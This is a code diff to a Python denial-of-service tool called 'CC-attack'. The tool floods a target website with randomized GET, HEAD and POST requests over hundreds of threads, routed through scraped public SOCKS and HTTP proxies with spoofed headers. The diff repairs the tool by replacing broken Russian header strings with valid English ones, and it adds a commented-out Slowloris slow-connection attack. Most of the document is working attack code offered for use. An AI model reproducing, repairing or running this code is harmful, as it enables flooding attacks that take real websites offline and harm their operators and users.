@@ -75,6 +75,7 @@ referers = [
 	"https://www.google.co.ao/search?q=",
 ]
 
+######### Default value ########
 mode = "cc"
 url = ""
 proxy_ver = "5"
@@ -83,12 +84,12 @@ out_file = "proxy.txt"
 thread_num = 800
 data = ""
 cookies = ""
-
+###############################
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
-
+###################################################
 Intn = random.randint
 Choice = random.choice
-
+###################################################
 def build_threads(mode,thread_num,event,proxy_type):
 	if mode == "post":
 		for _ in range(thread_num):
@@ -147,7 +148,7 @@ def getuseragent():
 		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
 def randomurl():
-	return str(Intn(0,271400281257))
+	return str(Intn(0,271400281257))#less random, more performance
 
 def GenReqHeader(method):
 	global data
@@ -155,24 +156,24 @@ def GenReqHeader(method):
 	global path
 	header = ""
 	if method == "get" or method == "head":
-		connection = "Подключение:\r\n"
+		connection = "Connection: Keep-Alive\r\n"
 		if cookies != "":
-			connection += "Куки: "+str(cookies)+"\r\n"
+			connection += "Cookies: "+str(cookies)+"\r\n"
 		accept = Choice(acceptall)
-		referer = " "+Choice(referers)+ target + path + "\r\n"
+		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
 		useragent = "User-Agent: " + getuseragent() + "\r\n"
 		header =  referer + useragent + accept + connection + "\r\n"
 	elif method == "post":
 		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
-		content = "Тип-контента: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
-		refer = ": http://"+ target + path + "\r\n"
+		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
+		refer = "Referer: http://"+ target + path + "\r\n"
 		user_agent = "User-Agent: " + getuseragent() + "\r\n"
 		accept = Choice(acceptall)
-		if data == "":
+		if data == "":# You can enable customize data
 			data = str(random._urandom(16))
-		length = "Длина-Содержимого "+str(len(data))+" \r\nПодключение\r\n"
+		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
 		if cookies != "":
-			length += "Куки: "+str(cookies)+"\r\n"
+			length += "Cookies: "+str(cookies)+"\r\n"
 		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
 	return header
 
@@ -183,30 +184,31 @@ def ParseUrl(original_url):
 	global protocol
 	original_url = original_url.strip()
 	url = ""
-	path = "/"
-	port = 80 
+	path = "/"#default value
+	port = 80 #default value
 	protocol = "http"
-
+	#http(s)://www.example.com:1337/xxx
 	if original_url[:7] == "http://":
 		url = original_url[7:]
 	elif original_url[:8] == "https://":
 		url = original_url[8:]
 		protocol = "https"
 	else:
-		print(">Это похоже на неправильный URL.")
+		print("> That looks like not a correct url.")
 		exit()
-	
+	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
+	#print(url) #for debug
 	tmp = url.split("/")
-	website = tmp[0]
+	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
 	check = website.split(":")
-	if len(check) != 1:
+	if len(check) != 1:#detect the port
 		port = int(check[1])
 	else:
 		if protocol == "https":
 			port = 443
 	target = check[0]
 	if len(tmp) > 1:
-		path = url.replace(website,"",1)
+		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx
 
 def InputOption(question,options,default):
 	ans = ""
@@ -215,7 +217,7 @@ def InputOption(question,options,default):
 		if ans == "":
 			ans = default
 		elif ans not in options:
-			print("> Пожалуйста, введите правильную опцию")
+			print("> Please enter the correct option")
 			ans = ""
 			continue
 	return ans
@@ -251,14 +253,14 @@ def cc(event,proxy_type):
 					if not sent:
 						proxy = Choice(proxies).strip().split(":")
 						break
-				
+				#s.setsockopt(socket.SO_LINGER,0)
 				s.close()
 			except:
 				s.close()
 		except:
 			s.close()
 
-def head(event,proxy_type):
+def head(event,proxy_type):#HEAD MODE
 	header = GenReqHeader("head")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -287,11 +289,11 @@ def head(event,proxy_type):
 					sent = s.send(str.encode(request))
 					if not sent:
 						proxy = Choice(proxies).strip().split(":")
-						break
+						break#   This part will jump to dirty fix
 				s.close()
 			except:
 				s.close()
-		except:
+		except:#dirty fix
 			s.close()
 
 def post(event,proxy_type):
@@ -324,9 +326,67 @@ def post(event,proxy_type):
 				s.close()
 		except:
 			s.close()
-
+''' idk why it's not working, so i temporarily removed it
+def slow_atk_conn(proxy_type,rlock):
+	global socket_list
+	proxy = Choice(proxies).strip().split(":")
+	while 1:
+		try:
+			s = socks.socksocket()
+			if proxy_type == 4:
+				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			if proxy_type == 5:
+				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+if proxy_type == 0:
+				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+			s.settimeout(3)
+			s.connect((str(target), int(port)))
+			if str(port) == '443':
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=target)
+			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
+			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
+			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+			if cookies != "":
+				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
+			s.send(("Connection:keep-alive").encode("utf-8"))
+			rlock.acquire()
+			socket_list.append(s)
+			rlock.release()
+			return
+		except:
+			#print("Connection failed")
+			s.close()
+			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
+socket_list=[]
+def slow(conn,proxy_type):
+	global socket_list
+	rlock = threading.Lock
+	for _ in range(conn):
+		threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
+	while True:
+		sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+		sys.stdout.flush()
+		if len(socket_list) != 0 :
+			for s in list(socket_list):
+				try:
+					s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
+					sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+					sys.stdout.flush()
+				except:
+					s.close()
+					socket_list.remove(s)
+					sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+					sys.stdout.flush()
+			proxy = Choice(proxies).strip().split(":")
+			for _ in range(conn - len(socket_list)):
+				threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
+		else:
+			time.sleep(0.1)
+'''		
+		
 nums = 0
-def checking(lines,proxy_type,ms,rlock,):
+def checking(lines,proxy_type,ms,rlock,):#Proxy checker coded by Leeon123
 	global nums
 	global proxies
 	proxy = lines.strip().split(":")
@@ -352,6 +412,10 @@ def checking(lines,proxy_type,ms,rlock,):
 				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 			s.settimeout(ms)
 			s.connect(("1.1.1.1", 80))
+			'''
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=target)'''
 			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
 			if not sent:
 				err += 1
@@ -361,7 +425,7 @@ def checking(lines,proxy_type,ms,rlock,):
 			err +=1
 	nums += 1
 
-def check_socks(ms):
+def check_socks(ms):#Coded by Leeon123
 	global nums
 	thread_list=[]
 	rlock = threading.RLock()
@@ -377,22 +441,23 @@ def check_socks(ms):
 			th.start()
 		thread_list.append(th)
 		time.sleep(0.01)
-		sys.stdout.write("> Прокси "+str(nums)+" проверены\r")
+		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
 		sys.stdout.flush()
 	for th in list(thread_list):
 		th.join()
-		sys.stdout.write("> Прокси "+str(nums)+" проверены\r")
+		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
 		sys.stdout.flush()
-	print("\r\n> Все прокси проверены! Вперед!:"+str(len(proxies)))
-	
+	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
+	#ans = input("> Do u want to save them in a file? (y/n, default=y)")
+	#if ans == "y" or ans == "":
 	with open(out_file, 'wb') as fp:
 		for lines in list(proxies):
 			fp.write(bytes(lines,encoding='utf8'))
 		fp.close()
-	print("> Сохранены в  "+out_file)
+	print("> They are saved in "+out_file)
 			
 def check_list(socks_file):
-	print("> Просмотреть список")
+	print("> Checking list")
 	temp = open(socks_file).readlines()
 	temp_list = []
 	for i in temp:
@@ -429,7 +494,7 @@ def DownloadProxies(proxy_ver):
 			except:
 				pass
 		f.close()
-		try:
+		try:#credit to All3xJ
 			r = requests.get("https://www.socks-proxy.net/",timeout=5)
 			part = str(r.content)
 			part = part.split("<tbody>")
@@ -459,7 +524,7 @@ def DownloadProxies(proxy_ver):
 			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
 			"https://api.openproxylist.xyz/socks5.txt",
 			"https://www.freeproxychecker.com/result/socks5_proxies.txt",
-			
+			#"http://www.socks24.org/feeds/posts/default"
 		]
 		for api in socks5_api:
 			try:
@@ -474,6 +539,7 @@ def DownloadProxies(proxy_ver):
 			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
 			"https://www.proxy-list.download/api/v1/get?type=http",
 			"https://www.proxyscan.io/download?type=http",
+			#"http://spys.me/proxy.txt",
 			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
 			"https://api.openproxylist.xyz/http.txt",
 			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
@@ -498,7 +564,7 @@ def DownloadProxies(proxy_ver):
 			except:
 				pass
 		f.close()
-print("> Have already downloaded proxies list as "+out_file)
+	print("> Have already downloaded proxies list as "+out_file)
 
 def PrintHelp():
 	print('''===============  CC-attack help list  ===============
